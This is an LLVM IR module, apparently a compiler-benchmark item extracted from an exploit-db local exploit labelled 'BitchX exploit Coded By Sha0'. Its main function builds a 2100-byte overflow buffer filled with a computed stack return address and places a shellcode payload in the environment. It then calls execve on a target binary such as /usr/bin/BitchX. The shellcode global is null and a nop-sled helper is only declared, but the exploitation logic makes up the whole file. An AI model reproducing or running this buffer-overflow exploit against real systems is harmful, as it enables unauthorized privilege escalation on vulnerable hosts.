; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_586.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_586.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [5 x i8] c"bash\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@.str.2 = private unnamed_addr constant [11 x i8] c"TERM=xterm\00", align 1
@payload = common dso_local global i8* null, align 8
@stdout = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [30 x i8] c"BitchX exploit Coded By Sha0\0A\00", align 1
@.str.4 = private unnamed_addr constant [25 x i8] c"ej: %s /usr/bin/BitchX\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"execve()\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca [4 x i8*], align 16
  %10 = alloca [3 x i8*], align 16
  %11 = alloca [1 x i8], align 1
  %12 = alloca [4 x i8], align 1
  %13 = alloca i64, align 8
  %14 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8** %7, align 8
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8** %8, align 8
  %15 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 0
  %16 = load i8*, i8** %7, align 8
  store i8* %16, i8** %15, align 8
  %17 = getelementptr inbounds i8*, i8** %15, i64 1
  %18 = load i8*, i8** %8, align 8
  store i8* %18, i8** %17, align 8
  %19 = getelementptr inbounds i8*, i8** %17, i64 1
  %20 = load i8*, i8** %6, align 8
  store i8* %20, i8** %19, align 8
  %21 = getelementptr inbounds i8*, i8** %19, i64 1
  store i8* null, i8** %21, align 8
  %22 = getelementptr inbounds [3 x i8*], [3 x i8*]* %10, i64 0, i64 0
  store i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0), i8** %22, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 1
  %24 = load i8*, i8** @payload, align 8
  store i8* %24, i8** %23, align 8
  %25 = getelementptr inbounds i8*, i8** %23, i64 1
  store i8* null, i8** %25, align 8
  %26 = bitcast [1 x i8]* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 1 %26, i8 0, i64 1, i1 false)
  %27 = load i32, i32* %4, align 4
  %28 = icmp ne i32 %27, 2
  br i1 %28, label %29, label %37

29:                                               ; preds = %2
  %30 = load i32, i32* @stdout, align 4
  %31 = call i32 (i32, i8*, ...) @fprintf(i32 %30, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0))
  %32 = load i32, i32* @stdout, align 4
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 0
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 (i32, i8*, ...) @fprintf(i32 %32, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.4, i64 0, i64 0), i8* %35)
  store i32 1, i32* %3, align 4
  br label %95

37:                                               ; preds = %2
  %38 = call i64 @malloc(i32 2100)
  %39 = inttoptr i64 %38 to i8*
  store i8* %39, i8** %6, align 8
  %40 = load i8*, i8** %6, align 8
  %41 = call i32 @bzero(i8* %40, i32 8)
  %42 = load i8*, i8** %6, align 8
  %43 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 2
  store i8* %42, i8** %43, align 16
  %44 = call i32 (...) @nopea()
  %45 = load i8*, i8** @payload, align 8
  %46 = call i64 @strlen(i8* %45)
  %47 = sub i64 3221225466, %46
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 1
  %50 = load i8*, i8** %49, align 8
  %51 = call i64 @strlen(i8* %50)
  %52 = sub i64 %47, %51
  store i64 %52, i64* %13, align 8
  %53 = load i64, i64* %13, align 8
  %54 = and i64 255, %53
  %55 = trunc i64 %54 to i8
  %56 = getelementptr inbounds [4 x i8], [4 x i8]* %12, i64 0, i64 0
  store i8 %55, i8* %56, align 1
  %57 = load i64, i64* %13, align 8
  %58 = and i64 65280, %57
  %59 = lshr i64 %58, 8
  %60 = trunc i64 %59 to i8
  %61 = getelementptr inbounds [4 x i8], [4 x i8]* %12, i64 0, i64 1
  store i8 %60, i8* %61, align 1
  %62 = load i64, i64* %13, align 8
  %63 = and i64 16711680, %62
  %64 = lshr i64 %63, 16
  %65 = trunc i64 %64 to i8
  %66 = getelementptr inbounds [4 x i8], [4 x i8]* %12, i64 0, i64 2
  store i8 %65, i8* %66, align 1
  %67 = load i64, i64* %13, align 8
  %68 = and i64 4278190080, %67
  %69 = lshr i64 %68, 24
  %70 = trunc i64 %69 to i8
  %71 = getelementptr inbounds [4 x i8], [4 x i8]* %12, i64 0, i64 3
  store i8 %70, i8* %71, align 1
  store i32 0, i32* %14, align 4
  br label %72

72:                                               ; preds = %82, %37
  %73 = load i32, i32* %14, align 4
  %74 = icmp slt i32 %73, 2088
  br i1 %74, label %75, label %85

75:                                               ; preds = %72
  %76 = load i8*, i8** %6, align 8
  %77 = load i32, i32* %14, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = getelementptr inbounds [4 x i8], [4 x i8]* %12, i64 0, i64 0
  %81 = call i32 @memcpy(i8* %79, i8* %80, i32 4)
  br label %82

82:                                               ; preds = %75
  %83 = load i32, i32* %14, align 4
  %84 = add nsw i32 %83, 4
  store i32 %84, i32* %14, align 4
  br label %72

85:                                               ; preds = %72
  %86 = load i8**, i8*** %5, align 8
  %87 = getelementptr inbounds i8*, i8** %86, i64 1
  %88 = load i8*, i8** %87, align 8
  %89 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 0
  %90 = getelementptr inbounds [3 x i8*], [3 x i8*]* %10, i64 0, i64 0
  %91 = call i32 @execve(i8* %88, i8** %89, i8** %90)
  %92 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0))
  %93 = load i8*, i8** %6, align 8
  %94 = call i32 @free(i8* %93)
  store i32 0, i32* %3, align 4
  br label %95

95:                                               ; preds = %85, %29
  %96 = load i32, i32* %3, align 4
  ret i32 %96
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i64 @malloc(i32) #2

declare dso_local i32 @bzero(i8*, i32) #2

declare dso_local i32 @nopea(...) #2

declare dso_local i64 @strlen(i8*) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @execve(i8*, i8**, i8**) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @free(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
